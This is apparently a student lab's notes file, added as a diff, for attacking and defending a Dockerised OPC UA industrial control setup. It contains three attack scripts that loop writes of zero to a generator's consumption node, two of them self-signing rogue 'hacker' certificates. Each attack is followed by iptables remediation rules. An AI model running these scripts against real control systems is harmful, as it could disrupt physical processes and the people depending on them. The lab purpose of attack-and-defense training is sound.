@@ -1,0 +1,151 @@
+apk add openssl
+
+openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout private-key-hacker-1.pem -outform der -out certificates-all/certificate-hacker-1.der
+
+
+sudo iptables -I DOCKER-USER -p tcp --dport 22 -d <IP-ADDR-DEST> -j DROP
+
+docker run -it --network pfe-no-certs_default malicious-hacker
+docker run -it --network pfe_default malicious-hacker
+
+
+==== HACK SCRIPT 1 ===
+
+docker run --rm -it --network pfe-no-certs_default malicious-hacker
+
+
+cat << 'EOF' >> hack.py 
+import asyncio
+import sys
+
+import logging
+from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256
+from asyncua import Client, Node, ua
+from threading import Thread
+
+async def main():
+        client = Client("opc.tcp://server-gene2:4840/freeopcua/server/")
+        
+       
+        async with client :
+                uri = "http://examples.freeopcua.github.io"
+                idx = await client.get_namespace_index(uri)
+                conso = await client.nodes.root.get_child(["0:Objects", f"{idx}:Consommation", f"{idx}:consommation"])
+                while True:
+                        await conso.write_value(0)
+
+if __name__ == "__main__":
+
+        asyncio.run(main())
+EOF
+
+
+==== HACK SCRIPT 2 ===
+
+cp docker-compose.yml ../PFE/
+
+docker-compose up --build       #--build option is very important ! 
+
+docker run -it --network pfe_default malicious-hacker
+
+apk add openssl
+
+cd .. && openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 --config configuration_certs.cnf -keyout private-key-hacker-1.pem -outform der -out certificates-all/certificate-hacker-1.der
+
+>> docker-compose logs server-gene2 | grep cert
+
+
+cat << 'EOF' > hack.py
+import asyncio
+import sys
+
+import logging
+from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256
+from asyncua import Client, Node, ua
+from threading import Thread
+
+async def main():
+        client = Client("opc.tcp://server-gene2:4840/freeopcua/server/")
+        
+        await client.set_security(
+            SecurityPolicyBasic256Sha256,
+            certificate="/certificates-all/certificate-hacker-1.der",
+            private_key="/private-key-hacker-1.pem",
+            server_certificate=f"/certificates-all/certificate-gene-2.der"
+        )
+
+        async with client :
+                uri = "http://examples.freeopcua.github.io"
+                idx = await client.get_namespace_index(uri)
+                conso = await client.nodes.root.get_child(["0:Objects", f"{idx}:Consommation", f"{idx}:consommation"])
+                while True:
+                        await conso.write_value(0)
+
+if __name__ == "__main__":
+
+        asyncio.run(main())
+EOF
+
+
+
+exit
+
+
+>>> remediation
+
+docker inspect pfe_server-gene2_1 | grep IPA
+
+sudo iptables -I DOCKER-USER -p tcp --dport 22 -d <IP-ADDR-GENE2> -j DROP
+sudo iptables -L | tail  
+
+
+=== HACK SCRIPT 3 ===
+
+docker-compose exec server-gene2 sh
+
+
+cd .. && openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 --config configuration_certs.cnf -keyout private-key-hacker-2.pem -outform der -out certificates-all/certificate-hacker-2.der
+
+
+cat << 'EOF' > hack.py
+import asyncio
+import sys
+
+import logging
+from asyncua.crypto.security_policies import SecurityPolicyBasic256Sha256
+from asyncua import Client, Node, ua
+from threading import Thread
+
+async def main():
+        client = Client("opc.tcp://server-gene1:4840/freeopcua/server/")
+        
+        await client.set_security(
+            SecurityPolicyBasic256Sha256,
+            certificate="/certificates-all/certificate-hacker-2.der",
+            private_key="/private-key-hacker-2.pem",
+            server_certificate=f"/certificates-all/certificate-gene-1.der"
+        )
+
+        async with client :
+                uri = "http://examples.freeopcua.github.io"
+                idx = await client.get_namespace_index(uri)
+                conso = await client.nodes.root.get_child(["0:Objects", f"{idx}:Consommation", f"{idx}:consommation"])
+                while True:
+                        await conso.write_value(0)
+
+if __name__ == "__main__":
+
+        asyncio.run(main())
+EOF
+
+
+
+>>> remediation
+
+echo ==  GENE  == && docker inspect pfe_server-gene2_1 | grep IPA && echo ==  SCADA  == && docker inspect pfe_client-scada1_1 | grep IPA
+
+docker inspect pfe_client-scada1_1 | grep IPA
+
+sudo iptables -I DOCKER-USER -p tcp --dport 4840 -s <IP-ADDR-SCADA> -d <IP-ADDR-GENE> -j ACCEPT
+iptables -I DOCKER-USER -d <IP-ADDR-GENE> -j DROP
+
